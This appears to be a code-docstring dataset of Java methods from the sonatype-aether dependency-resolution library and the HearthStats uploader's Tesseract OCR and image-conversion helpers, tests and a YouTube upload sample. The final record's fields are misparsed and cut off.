{"docstring": "/**\n * Adds the specified version range to this constraint. All versions matched by the given range satisfy this\n * constraint.\n * \n * @param range The version range to add, may be {@code null}.\n * @return This constraint for chaining, never {@code null}.\n */\n", "func_signal": "public GenericVersionConstraint addRange( VersionRange range )", "code": "{\n    if ( range != null )\n    {\n        ranges.add( range );\n    }\n    return this;\n}", "path": "aether-util\\src\\main\\java\\org\\sonatype\\aether\\util\\version\\GenericVersionConstraint.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Adds the specified repository for the resolution.\n * \n * @param repository The repository to add, may be {@code null}.\n * @return This request for chaining, never {@code null}.\n */\n", "func_signal": "public VersionRequest addRepository( RemoteRepository repository )", "code": "{\n    if ( repository != null )\n    {\n        if ( this.repositories.isEmpty() )\n        {\n            this.repositories = new ArrayList<RemoteRepository>();\n        }\n        this.repositories.add( repository );\n    }\n    return this;\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\resolution\\VersionRequest.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets the exclusions for the dependency.\n * \n * @param exclusions The exclusions, may be {@code null}.\n * @return The new dependency, never {@code null}.\n */\n", "func_signal": "public Dependency setExclusions( Collection<Exclusion> exclusions )", "code": "{\n    if ( hasEquivalentExclusions( exclusions ) )\n    {\n        return this;\n    }\n    return new Dependency( artifact, scope, optional, exclusions );\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\graph\\Dependency.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Creates a new filter from the specified filters.\n * \n * @param filters The filters to combine, may be {@code null}.\n */\n", "func_signal": "public OrDependencyFilter( DependencyFilter... filters )", "code": "{\n    if ( filters != null )\n    {\n        Collections.addAll( this.filters, filters );\n    }\n}", "path": "aether-util\\src\\main\\java\\org\\sonatype\\aether\\util\\filter\\OrDependencyFilter.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets the scope of the dependency, e.g. \"compile\".\n * \n * @param scope The scope of the dependency, may be {@code null}.\n * @return The new dependency, never {@code null}.\n */\n", "func_signal": "public Dependency setScope( String scope )", "code": "{\n    if ( this.scope.equals( scope ) || ( scope == null && this.scope.length() <= 0 ) )\n    {\n        return this;\n    }\n    return new Dependency( artifact, scope, exclusions, optional );\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\graph\\Dependency.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Creates a new filter from the specified filters.\n * \n * @param filter1 The first filter to combine, may be {@code null}.\n * @param filter2 The first filter to combine, may be {@code null}.\n * @return The combined filter or {@code null} if both filter were {@code null}.\n */\n", "func_signal": "public static DependencyFilter newInstance( DependencyFilter filter1, DependencyFilter filter2 )", "code": "{\n    if ( filter1 == null )\n    {\n        return filter2;\n    }\n    else if ( filter2 == null )\n    {\n        return filter1;\n    }\n    return new OrDependencyFilter( filter1, filter2 );\n}", "path": "aether-util\\src\\main\\java\\org\\sonatype\\aether\\util\\filter\\OrDependencyFilter.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Creates a request with the specified properties.\n * \n * @param artifact The artifact whose (meta-)version should be resolved, may be {@code null}.\n * @param repositories The repositories to resolve the version from, may be {@code null}.\n * @param context The context in which this request is made, may be {@code null}.\n */\n", "func_signal": "public VersionRequest( Artifact artifact, List<RemoteRepository> repositories, String context )", "code": "{\n    setArtifact( artifact );\n    setRepositories( repositories );\n    setRequestContext( context );\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\resolution\\VersionRequest.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Creates a new workspace reader by chaining the specified readers. In contrast to the constructor, this factory\n * method will avoid creating an actual chained reader if one of the specified readers is actually {@code null}.\n * \n * @param reader1 The first workspace reader, may be {@code null}.\n * @param reader2 The second workspace reader, may be {@code null}.\n * @return The chained reader or {@code null} if no workspace reader was supplied.\n */\n", "func_signal": "public static WorkspaceReader newInstance( WorkspaceReader reader1, WorkspaceReader reader2 )", "code": "{\n    if ( reader1 == null )\n    {\n        return reader2;\n    }\n    else if ( reader2 == null )\n    {\n        return reader1;\n    }\n    return new ChainedWorkspaceReader( reader1, reader2 );\n}", "path": "aether-util\\src\\main\\java\\org\\sonatype\\aether\\util\\repository\\ChainedWorkspaceReader.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets the repositories to resolve the version from.\n * \n * @param repositories The repositories, may be {@code null}.\n * @return This request for chaining, never {@code null}.\n */\n", "func_signal": "public VersionRequest setRepositories( List<RemoteRepository> repositories )", "code": "{\n    if ( repositories == null )\n    {\n        this.repositories = Collections.emptyList();\n    }\n    else\n    {\n        this.repositories = repositories;\n    }\n    return this;\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\resolution\\VersionRequest.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets the implementation class for a service.\n * \n * @param <T> The service type.\n * @param type The interface describing the service, must not be {@code null}.\n * @param impl The implementation class of the service, must not be {@code null}.\n * @return This locator for chaining, never {@code null}.\n */\n", "func_signal": "public <T> DefaultServiceLocator setService( Class<T> type, Class<? extends T> impl )", "code": "{\n    classes.remove( type );\n    return addService( type, impl );\n}", "path": "aether-impl\\src\\main\\java\\org\\sonatype\\aether\\impl\\internal\\DefaultServiceLocator.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Adds the implementation class for a service.\n * \n * @param <T> The service type.\n * @param type The interface describing the service, must not be {@code null}.\n * @param impl The implementation class of the service, must not be {@code null}.\n * @return This locator for chaining, never {@code null}.\n */\n", "func_signal": "public <T> DefaultServiceLocator addService( Class<T> type, Class<? extends T> impl )", "code": "{\n    if ( impl == null )\n    {\n        throw new IllegalArgumentException( \"implementation class must not be null\" );\n    }\n    Collection<Class<?>> impls = classes.get( type );\n    if ( impls == null )\n    {\n        impls = new LinkedHashSet<Class<?>>();\n        classes.put( type, impls );\n    }\n    impls.add( impl );\n    return this;\n}", "path": "aether-impl\\src\\main\\java\\org\\sonatype\\aether\\impl\\internal\\DefaultServiceLocator.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Creates a new filter from the specified filters.\n * \n * @param filters The filters to combine, may be {@code null}.\n */\n", "func_signal": "public OrDependencyFilter( Collection<DependencyFilter> filters )", "code": "{\n    if ( filters != null )\n    {\n        this.filters.addAll( filters );\n    }\n}", "path": "aether-util\\src\\main\\java\\org\\sonatype\\aether\\util\\filter\\OrDependencyFilter.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets the recommended version to satisfy this constraint.\n * \n * @param version The recommended version for this constraint, may be {@code null} if none.\n * @return This constraint for chaining, never {@code null}.\n */\n", "func_signal": "public GenericVersionConstraint setVersion( Version version )", "code": "{\n    this.version = version;\n    return this;\n}", "path": "aether-util\\src\\main\\java\\org\\sonatype\\aether\\util\\version\\GenericVersionConstraint.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets the artifact whose (meta-)version shall be resolved.\n * \n * @param artifact The artifact, may be {@code null}.\n * @return This request for chaining, never {@code null}.\n */\n", "func_signal": "public VersionRequest setArtifact( Artifact artifact )", "code": "{\n    this.artifact = artifact;\n    return this;\n}", "path": "aether-api\\src\\main\\java\\org\\sonatype\\aether\\resolution\\VersionRequest.java", "repo_name": "sonatype/sonatype-aether", "stars": 66, "license": "None", "language": "java", "size": 11576}
{"docstring": "/**\n * Sets Tesseract's internal parameters.\n */\n", "func_signal": "private void setTessVariables()", "code": "{\n    Enumeration<?> em = prop.propertyNames();\n    while (em.hasMoreElements()) {\n        String key = (String) em.nextElement();\n        api.TessBaseAPISetVariable(handle, key, prop.getProperty(key));\n    }\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\tess4j\\Tesseract.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Creates a list of TIFF image files from an image file. It basically\n * converts images of other formats to TIFF format, or a multi-page TIFF\n * image to multiple TIFF image files.\n *\n * @param imageFile input image file\n * @param index an index of the page; -1 means all pages, as in a multi-page\n * TIFF image\n * @return a list of TIFF image files\n * @throws Exception\n */\n", "func_signal": "public static List<File> createTiffFiles(File imageFile, int index) throws IOException", "code": "{\n    List<File> tiffFiles = new ArrayList<File>();\n\n    String imageFileName = imageFile.getName();\n    String imageFormat = imageFileName.substring(imageFileName.lastIndexOf('.') + 1);\n\n    Iterator<ImageReader> readers = ImageIO.getImageReadersByFormatName(imageFormat);\n    \n    if (!readers.hasNext()) {\n        throw new RuntimeException(JAI_IMAGE_READER_MESSAGE);\n    }\n\n    ImageReader reader = readers.next();\n\n    ImageInputStream iis = ImageIO.createImageInputStream(imageFile);\n    reader.setInput(iis);\n    //Read the stream metadata\n//        IIOMetadata streamMetadata = reader.getStreamMetadata();\n\n    //Set up the writeParam\n    TIFFImageWriteParam tiffWriteParam = new TIFFImageWriteParam(Locale.US);\n    tiffWriteParam.setCompressionMode(ImageWriteParam.MODE_DISABLED);\n\n    //Get tif writer and set output to file\n    Iterator<ImageWriter> writers = ImageIO.getImageWritersByFormatName(TIFF_FORMAT);\n     \n    if (!writers.hasNext()) {\n        throw new RuntimeException(JAI_IMAGE_WRITER_MESSAGE);\n    }\n    \n    ImageWriter writer = writers.next();\n\n    //Read the stream metadata\n    IIOMetadata streamMetadata = writer.getDefaultStreamMetadata(tiffWriteParam);\n\n    int imageTotal = reader.getNumImages(true);\n\n    for (int i = 0; i < imageTotal; i++) {\n        // all if index == -1; otherwise, only index-th\n        if (index == -1 || i == index) {\n//                BufferedImage bi = reader.read(i);\n//                IIOImage oimage = new IIOImage(bi, null, reader.getImageMetadata(i));\n            IIOImage oimage = reader.readAll(i, reader.getDefaultReadParam());\n            File tiffFile = File.createTempFile(OUTPUT_FILE_NAME, TIFF_EXT);\n            ImageOutputStream ios = ImageIO.createImageOutputStream(tiffFile);\n            writer.setOutput(ios);\n            writer.write(streamMetadata, oimage, tiffWriteParam);\n            ios.close();\n            tiffFiles.add(tiffFile);\n        }\n    }\n    writer.dispose();\n    reader.dispose();\n\n    return tiffFiles;\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\vietocr\\ImageIOHelper.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Initializes Tesseract engine.\n */\n", "func_signal": "private void init()", "code": "{\n    pageNum = 0;\n    api = TessAPI.INSTANCE;\n    handle = api.TessBaseAPICreate();\n    api.TessBaseAPIInit2(handle, datapath, language, ocrEngineMode);\n    api.TessBaseAPISetPageSegMode(handle, psm);\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\tess4j\\Tesseract.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Set DPI using API.\n */\n", "func_signal": "private static IIOMetadata setDPIViaAPI(IIOMetadata imageMetadata, int dpiX, int dpiY)\n        throws IIOInvalidTreeException", "code": "{\n    // Derive the TIFFDirectory from the metadata.\n    TIFFDirectory dir = TIFFDirectory.createFromMetadata(imageMetadata);\n\n    // Get {X,Y}Resolution tags.\n    BaselineTIFFTagSet base = BaselineTIFFTagSet.getInstance();\n    TIFFTag tagXRes = base.getTag(BaselineTIFFTagSet.TAG_X_RESOLUTION);\n    TIFFTag tagYRes = base.getTag(BaselineTIFFTagSet.TAG_Y_RESOLUTION);\n\n    // Create {X,Y}Resolution fields.\n    TIFFField fieldXRes = new TIFFField(tagXRes, TIFFTag.TIFF_RATIONAL,\n            1, new long[][]{{dpiX, 1}});\n    TIFFField fieldYRes = new TIFFField(tagYRes, TIFFTag.TIFF_RATIONAL,\n            1, new long[][]{{dpiY, 1}});\n\n    // Append {X,Y}Resolution fields to directory.\n    dir.addTIFFField(fieldXRes);\n    dir.addTIFFField(fieldYRes);\n\n    // Convert to metadata object and return.\n    return dir.getAsMetadata();\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\vietocr\\ImageIOHelper.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Converts <code>BufferedImage</code> to <code>ByteBuffer</code>.\n * \n * @param bi Input image\n * @return pixel data\n */\n", "func_signal": "public static ByteBuffer convertImageData(BufferedImage bi)", "code": "{\n    DataBuffer buff = bi.getRaster().getDataBuffer();\n    // ClassCastException thrown if buff not instanceof DataBufferByte because raster data is not necessarily bytes.\n    // Convert the original buffered image to grayscale.\n    if (!(buff instanceof DataBufferByte)) {\n        bi = ImageHelper.convertImageToGrayscale(bi);\n        buff = bi.getRaster().getDataBuffer();\n    }\n    byte[] pixelData = ((DataBufferByte) buff).getData();\n    //        return ByteBuffer.wrap(pixelData);\n    ByteBuffer buf = ByteBuffer.allocateDirect(pixelData.length);\n    buf.order(ByteOrder.nativeOrder());\n    buf.put(pixelData);\n    buf.flip();\n    return buf;\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\vietocr\\ImageIOHelper.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Gets recognized text.\n */\n", "func_signal": "private String getOCRText()", "code": "{\n    Pointer utf8Text = hocr ? api.TessBaseAPIGetHOCRText(handle, pageNum - 1) : api.TessBaseAPIGetUTF8Text(handle);\n    String str = utf8Text.getString(0);\n    api.TessDeleteText(utf8Text);\n    return str;\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\tess4j\\Tesseract.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Gets a list of <code>IIOImage</code> objects for an image file.\n *\n * @param imageFile input image file. It can be any of the supported\n * formats, including TIFF, JPEG, GIF, PNG, BMP, JPEG, and PDF if GPL\n * Ghostscript is installed\n * @return a list of <code>IIOImage</code> objects\n * @throws Exception\n */\n", "func_signal": "public static List<IIOImage> getIIOImageList(File imageFile) throws IOException", "code": "{\n    File workingTiffFile = null;\n\n    ImageReader reader = null;\n    ImageInputStream iis = null;\n\n    try {\n        List<IIOImage> iioImageList = new ArrayList<IIOImage>();\n\n        String imageFileName = imageFile.getName();\n        String imageFormat = imageFileName.substring(imageFileName.lastIndexOf('.') + 1);\n        if (imageFormat.matches(\"(pbm|pgm|ppm)\")) {\n            imageFormat = \"pnm\";\n        } else if (imageFormat.equals(\"jp2\")) {\n            imageFormat = \"jpeg2000\";\n        }\n        Iterator<ImageReader> readers = ImageIO.getImageReadersByFormatName(imageFormat);\n        \n        if (!readers.hasNext()) {\n            throw new RuntimeException(JAI_IMAGE_READER_MESSAGE);\n        }\n\n        reader = readers.next();\n        iis = ImageIO.createImageInputStream(imageFile);\n        reader.setInput(iis);\n\n        int imageTotal = reader.getNumImages(true);\n\n        for (int i = 0; i < imageTotal; i++) {\n//                IIOImage oimage = new IIOImage(reader.read(i), null, reader.getImageMetadata(i));\n            IIOImage oimage = reader.readAll(i, reader.getDefaultReadParam());\n            iioImageList.add(oimage);\n        }\n\n        return iioImageList;\n    } finally {\n        try {\n            if (iis != null) {\n                iis.close();\n            }\n            if (reader != null) {\n                reader.dispose();\n            }\n        } catch (Exception e) {\n            // ignore\n        }\n        if (workingTiffFile != null && workingTiffFile.exists()) {\n            workingTiffFile.delete();\n        }\n    }\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\vietocr\\ImageIOHelper.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Performs OCR operation.\n *\n * @param bi a buffered image\n * @param rect the bounding rectangle defines the region of the image to be\n * recognized. A rectangle of zero dimension or\n * <code>null</code> indicates the whole image.\n * @return the recognized text\n * @throws TesseractException\n */\n", "func_signal": "public String doOCR(BufferedImage bi, Rectangle rect) throws TesseractException", "code": "{\n    try {\n        return doOCR(ImageIOHelper.getIIOImageList(bi), rect);\n    } catch (Exception e) {\n        logger.log(Level.SEVERE, e.getMessage(), e);\n        throw new TesseractException(e);\n    }\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\tess4j\\Tesseract.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Gets an instance of the class library.\n *\n * @return instance\n */\n", "func_signal": "public static synchronized Tesseract getInstance()", "code": "{\n    if (instance == null) {\n        instance = new Tesseract();\n    }\n\n    return instance;\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\tess4j\\Tesseract.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Performs OCR operation.\n *\n * @param imageList a list of\n * <code>IIOImage</code> objects\n * @param rect the bounding rectangle defines the region of the image to be\n * recognized. A rectangle of zero dimension or\n * <code>null</code> indicates the whole image.\n * @return the recognized text\n * @throws TesseractException\n */\n", "func_signal": "public String doOCR(List<IIOImage> imageList, Rectangle rect) throws TesseractException", "code": "{\n    init();\n    setTessVariables();\n\n    try {\n        StringBuilder sb = new StringBuilder();\n\n        for (IIOImage oimage : imageList) {\n            pageNum++;\n            try {\n                setImage(oimage.getRenderedImage(), rect);\n                sb.append(getOCRText());\n            } catch (IOException ioe) {\n                // skip the problematic image\n                logger.log(Level.SEVERE, ioe.getMessage(), ioe);\n            }\n        }\n\n        if (hocr) {\n            sb.insert(0, htmlBeginTag).append(htmlEndTag);\n        }\n        \n        return sb.toString();\n    } finally {\n        dispose();\n    }\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\tess4j\\Tesseract.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "// @Test\n", "func_signal": "public void testPerformOcr() throws Exception", "code": "{\n\n        testRankLevel(\"ranklevel-17-a.png\", \"17\");\n        testRankLevel(\"ranklevel-18-a.png\", \"18\");\n        testRankLevel(\"ranklevel-18-b.png\", \"18\");\n        testRankLevel(\"ranklevel-19-a.png\", \"19\");\n        testRankLevel(\"ranklevel-19-b.png\", \"19\");\n        testRankLevel(\"ranklevel-20-a.png\", \"20\");\n        testRankLevel(\"ranklevel-21-a.png\", \"21\");\n        testRankLevel(\"ranklevel-22-a.png\", \"22\");\n\n    }", "path": "companion\\src\\test\\java\\net\\hearthstats\\game\\ocr\\RankLevelOcrTest.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Writes an inline Javascript which zooms in on the reference pixel area and highlights the reference pixel location.\n */\n", "func_signal": "private void writeCanvasJavascript(BufferedWriter output, List<Coordinate> coordinates) throws IOException", "code": "{\n    output.write(\"<script type=\\\"text/javascript\\\">\\n\" +\n            \"function drawPixel(id, x, y) {\\n\" +\n            \"\\n\" +\n            \"    var canvas = document.getElementById(\\\"canvas_\\\" + id);\\n\" +\n            \"    var ctx = canvas.getContext(\\\"2d\\\");\\n\" +\n            \"    \\n\" +\n            \"    var image = new Image();\\n\" +\n            \"    image.onload = function()\\n\" +\n            \"    {\\n\" +\n            \"\\t\\tvar xoff = Math.floor(x / 200) * 200 - 50;\\n\" +\n            \"\\t\\tvar yoff = Math.floor(y / 200) * 200 - 50;\\n\" +\n            \"\\t\\tctx.drawImage(image, xoff, yoff, 300, 300, 0, 0, 300, 300);\\n\" +\n            \"\\t\\tctx.beginPath();\\n\" +\n            \"\\t\\tx = x - xoff;\\n\" +\n            \"\\t\\ty = y - yoff;\\n\" +\n            \"\\t\\tctx.strokeStyle = \\\"rgba(255,255,255,0.8)\\\";\\n\" +\n            \"\\t\\tctx.lineWidth = 4\\n\" +\n            \"\\t\\tctx.strokeRect(x-6, y-6, 12, 12);\\n\" +\n            \"\\t\\tctx.strokeStyle = \\\"rgba(0,0,0,0.8)\\\";\\n\" +\n            \"\\t\\tctx.lineWidth = 1\\n\" +\n            \"\\t\\tctx.strokeRect(x-4, y-4, 8, 8);\\n\" +\n            \"\\t\\tctx.strokeRect(x-8, y-8, 16, 16);\\n\" +\n            \"    }\\n\" +\n            \"    image.src = document.getElementById(\\\"img_\\\" + id).src;\\t\\n\" +\n            \"}\\n\" +\n            \"\\n\" +\n            \"window.addEventListener(\\\"DOMContentLoaded\\\", function()\\n\" +\n            \"{\\n\");\n    for (int i = 0; i < coordinates.size(); i++) {\n        Coordinate coordinate = coordinates.get(i);\n        if (coordinate != null) {\n\t\t\t\toutput.write(\"drawPixel(\\\"\" + i + \"\\\", \" + coordinate.x()\n\t\t\t\t\t\t+ \", \" + coordinate.y() + \");\\n\");\n        }\n    }\n    output.write(\"});\\n\" +\n            \"</script>\");\n\n\n}", "path": "companion\\src\\test\\java\\net\\hearthstats\\game\\imageanalysis\\RelativePixelAnalyserMain.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Enables hocr output.\n *\n * @param hocr to enable or disable hocr output\n */\n", "func_signal": "public void setHocr(boolean hocr)", "code": "{\n    this.hocr = hocr;\n    prop.setProperty(\"tessedit_create_hocr\", hocr ? \"1\" : \"0\");\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\tess4j\\Tesseract.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "// @Test\n", "func_signal": "public void testParseString() throws Exception", "code": "{\n        Assert.assertEquals(\"17\", rankLevelOcr.parseString(\"i7\", 0));\n        Assert.assertEquals(\"15\", rankLevelOcr.parseString(\"is\", 0));\n        Assert.assertEquals(\"10\", rankLevelOcr.parseString(\"I0\", 0));\n        Assert.assertEquals(\"10\", rankLevelOcr.parseString(\"IO\", 0));\n        Assert.assertEquals(\"5\", rankLevelOcr.parseString(\"S\", 0));\n    }", "path": "companion\\src\\test\\java\\net\\hearthstats\\game\\ocr\\RankLevelOcrTest.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Gets a list of <code>IIOImage</code> objects for a <code>BufferedImage</code>.\n * @param bi input image\n * @return a list of <code>IIOImage</code> objects\n * @throws IOException \n */\n", "func_signal": "public static List<IIOImage> getIIOImageList(BufferedImage bi) throws IOException", "code": "{\n    List<IIOImage> iioImageList = new ArrayList<IIOImage>();\n    IIOImage oimage = new IIOImage(bi, null, null);\n    iioImageList.add(oimage);\n    return iioImageList;\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\vietocr\\ImageIOHelper.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Reads image meta data.\n *\n * @param oimage\n * @return a map of meta data\n */\n", "func_signal": "public static Map<String, String> readImageData(IIOImage oimage)", "code": "{\n    Map<String, String> dict = new HashMap<String, String>();\n\n    IIOMetadata imageMetadata = oimage.getMetadata();\n    if (imageMetadata != null) {\n        IIOMetadataNode dimNode = (IIOMetadataNode) imageMetadata.getAsTree(\"javax_imageio_1.0\");\n        NodeList nodes = dimNode.getElementsByTagName(\"HorizontalPixelSize\");\n        int dpiX;\n        if (nodes.getLength() > 0) {\n            float dpcWidth = Float.parseFloat(nodes.item(0).getAttributes().item(0).getNodeValue());\n            dpiX = (int) Math.round(25.4f / dpcWidth);\n        } else {\n            dpiX = Toolkit.getDefaultToolkit().getScreenResolution();\n        }\n        dict.put(\"dpiX\", String.valueOf(dpiX));\n\n        nodes = dimNode.getElementsByTagName(\"VerticalPixelSize\");\n        int dpiY;\n        if (nodes.getLength() > 0) {\n            float dpcHeight = Float.parseFloat(nodes.item(0).getAttributes().item(0).getNodeValue());\n            dpiY = (int) Math.round(25.4f / dpcHeight);\n        } else {\n            dpiY = Toolkit.getDefaultToolkit().getScreenResolution();\n        }\n        dict.put(\"dpiY\", String.valueOf(dpiY));\n    }\n\n    return dict;\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\vietocr\\ImageIOHelper.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Merges multiple images into one TIFF image.\n *\n * @param inputImages an array of image files\n * @param outputTiff the output TIFF file\n * @throws Exception\n */\n", "func_signal": "public static void mergeTiff(File[] inputImages, File outputTiff) throws IOException", "code": "{\n    List<IIOImage> imageList = new ArrayList<IIOImage>();\n\n    for (int i = 0; i < inputImages.length; i++) {\n        imageList.addAll(getIIOImageList(inputImages[i]));\n    }\n\n    if (imageList.isEmpty()) {\n        // if no image\n        return;\n    }\n\n    Iterator<ImageWriter> writers = ImageIO.getImageWritersByFormatName(TIFF_FORMAT);\n    \n    if (!writers.hasNext()) {\n        throw new RuntimeException(JAI_IMAGE_WRITER_MESSAGE);\n    }\n            \n    ImageWriter writer = writers.next();\n\n    //Set up the writeParam\n    TIFFImageWriteParam tiffWriteParam = new TIFFImageWriteParam(Locale.US);\n    tiffWriteParam.setCompressionMode(ImageWriteParam.MODE_DISABLED);\n\n    //Get the stream metadata\n    IIOMetadata streamMetadata = writer.getDefaultStreamMetadata(tiffWriteParam);\n\n    ImageOutputStream ios = ImageIO.createImageOutputStream(outputTiff);\n    writer.setOutput(ios);\n\n    IIOImage firstIioImage = imageList.remove(0);\n    writer.write(streamMetadata, firstIioImage, tiffWriteParam);\n\n    int i = 1;\n    for (IIOImage iioImage : imageList) {\n        writer.writeInsert(i++, iioImage, tiffWriteParam);\n    }\n    ios.close();\n\n    writer.dispose();\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\vietocr\\ImageIOHelper.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/**\n * Gets pixel data of an <code>RenderedImage</code> object.\n * @param image an <code>RenderedImage</code> object\n * @return a byte buffer of pixel data\n * @throws IOException \n */\n", "func_signal": "public static ByteBuffer getImageByteBuffer(RenderedImage image) throws IOException", "code": "{\n    //Set up the writeParam\n    TIFFImageWriteParam tiffWriteParam = new TIFFImageWriteParam(Locale.US);\n    tiffWriteParam.setCompressionMode(ImageWriteParam.MODE_DISABLED);\n\n    //Get tif writer and set output to file\n    Iterator<ImageWriter> writers = ImageIO.getImageWritersByFormatName(TIFF_FORMAT);\n    \n    if (!writers.hasNext()) {\n        throw new RuntimeException(JAI_IMAGE_WRITER_MESSAGE);\n    }\n\n    ImageWriter writer = writers.next();\n    \n    //Get the stream metadata\n    IIOMetadata streamMetadata = writer.getDefaultStreamMetadata(tiffWriteParam);\n\n    ByteArrayOutputStream outputStream = new ByteArrayOutputStream();\n    ImageOutputStream ios = ImageIO.createImageOutputStream(outputStream);\n    writer.setOutput(ios);\n    writer.write(streamMetadata, new IIOImage(image, null, null), tiffWriteParam);\n//        writer.write(image);\n    writer.dispose();\n//        ImageIO.write(image, \"tiff\", ios); // this can be used in lieu of writer\n    ios.seek(0);\n    BufferedImage bi = ImageIO.read(ios);\n    return convertImageData(bi);\n}", "path": "companion\\src\\main\\java\\net\\sourceforge\\vietocr\\ImageIOHelper.java", "repo_name": "HearthStats/HearthStats.net-Uploader", "stars": 125, "license": "bsd-3-clause", "language": "java", "size": 427337}
{"docstring": "/*\";\n\n    private static final String SAMPLE_VIDEO_FILENAME = \"sample-video.mp4\";\n\n    /**\n     * Upload the user-selected video to the user's YouTube channel. The code\n     * looks for the video in the application's project folder and uses OAuth\n     * 2.0 to authorize the API request.\n     *\n     * @param args command line args (not used).\n     */\n", "func_signal": "public static void main(String[] args)", "code": "{\n\n        // This OAuth 2.0 access scope allows an application to upload files\n        // to the authenticated user's YouTube channel, but doesn't allow\n        // other types of access.\n        List<String> scopes = Lists.newArrayList(\"https://www.googleapis.com/auth/youtube.upload\");\n\n        try {\n            // Authorize the request.\n            Credential credential = Auth.authorize(scopes, \"uploadvideo\");\n\n            // This object is used to make YouTube Data API requests.\n            youtube = new YouTube.Builder(Auth.HTTP_TRANSPORT, Auth.JSON_FACTORY, credential).setApplicationName(\n                    \"youtube-cmdline-uploadvideo-sample\").build();\n\n            System.out.println(\"Uploading: \" + SAMPLE_VIDEO_FILENAME);\n\n            // Add extra information to the video before uploading.\n            Video videoObjectDefiningMetadata = new Video();\n\n            // Set the video to be publicly visible. This is the default\n            // setting. Other supporting settings are \"unlisted\" and \"private.\"\n            VideoStatus status = new VideoStatus();\n            status.setPrivacyStatus(\"public\");\n            videoObjectDefiningMetadata.setStatus(status);\n\n            // Most of the video's metadata is set on the VideoSnippet object.\n            VideoSnippet snippet = new VideoSnippet();\n\n            // This code uses a Calendar instance to create a unique name and\n            // description for test purposes so that you can easily upload\n            // multiple files. You should remove this code from your 